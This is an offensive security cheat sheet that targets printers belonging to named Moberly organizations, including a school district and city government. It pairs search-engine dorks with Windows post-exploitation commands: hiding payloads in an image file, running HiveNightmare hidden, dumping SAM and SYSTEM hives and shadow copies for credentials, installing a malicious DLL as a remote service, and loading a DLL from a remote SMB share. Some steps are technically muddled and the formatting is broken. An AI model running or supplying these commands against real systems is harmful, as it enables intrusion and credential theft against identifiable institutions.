
# Moberly Printer Recon & Post-Exploitation Cheat Sheet

---

## Google Dorks for Moberly Printers

```plaintext
inurl:"/hp/device/this.LCDispatcher" "Moberly"
intitle:"Printer Status" "Moberly Public Schools"
intitle:"Web Image Monitor" inurl:"/wim" "Moberly"
inurl:"/printer/main.html" "City of Moberly"
intitle:"Web Jetadmin" "Moberly"
inurl:"/printers/" "Moberly"
inurl:"/PPS/public/" "Moberly"
intitle:"Konica Minolta" inurl:"/wcd/" "Moberly"
intitle:"PaperCut MF" "Moberly"
intitle:"Lexmark" inurl:"/printer/" "Moberly"
intitle:"Canon Remote UI" "Moberly"
intitle:"EpsonNet Config" "Moberly"
````

---

## Embedding & Extracting Payloads with Certutil

```cmd
copy /b nsfw.jpg + payload.7z nsfw.jpg
certutil -decode nsfw.jpg dropper.7z
7z x dropper.7z -oC:\Users\Public\
```

---

## Executing HiveNightmare.exe from Encoded File

```cmd
certutil -decode nsfw.jpg HiveNightmare.exe
start "" HiveNightmare.exe
```

Or stealthier with PowerShell:

```powershell
Start-Process -FilePath .\HiveNightmare.exe -WindowStyle Hidden
del HiveNightmare.exe
```

---

## Extracting SAM & SYSTEM Hives for Credential Dumping

```cmd
# Export SAM hive (requires admin privileges)
reg save HKLM\SAM C:\Windows\Temp\SAM.save

# Export SYSTEM hive (needed for decryption)
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save
```

---

## Using Shadow Copies to Access Protected Files

    
    vssadmin create shadow /for=C:
    diskshadow.exe /s script.txt
    # (script.txt should contain commands to expose shadow copy)
    
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\System32\config\SAM C:\Temp\SAM
```

Process dumped files offline or with custom scripts for hash extraction.

---

## Remote Execution Using Native Windows Tools (LOLBins)

    
    REM Map ADMIN$ share on target
    net use \\TARGET_IP\ADMIN$ /user:DOMAIN\AdminUser Password123
    copy malicious.dll \\TARGET_IP\ADMIN$\Temp\malicious.dll
    
    REM Create remote service running malicious DLL via rundll32
    sc.exe \\TARGET_IP create MaliciousService binPath= "rundll32.exe C:\Windows\Temp\malicious.dll,EntryPoint" start= auto
    
    REM Start the malicious service
    sc.exe \\TARGET_IP start MaliciousService
    
    REM Clean up the service
    sc.exe \\TARGET_IP delete MaliciousService
    
    REM Alternatively, execute directly with WMIC
    wmic /node:"TARGET_IP" process call create "rundll32.exe C:\Windows\Temp\malicious.dll,EntryPoint"
```

---

## Direct Reflective DLL Injection Over SMB


    rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
```

---

*Use these commands responsibly within authorized environments only.*

```
```
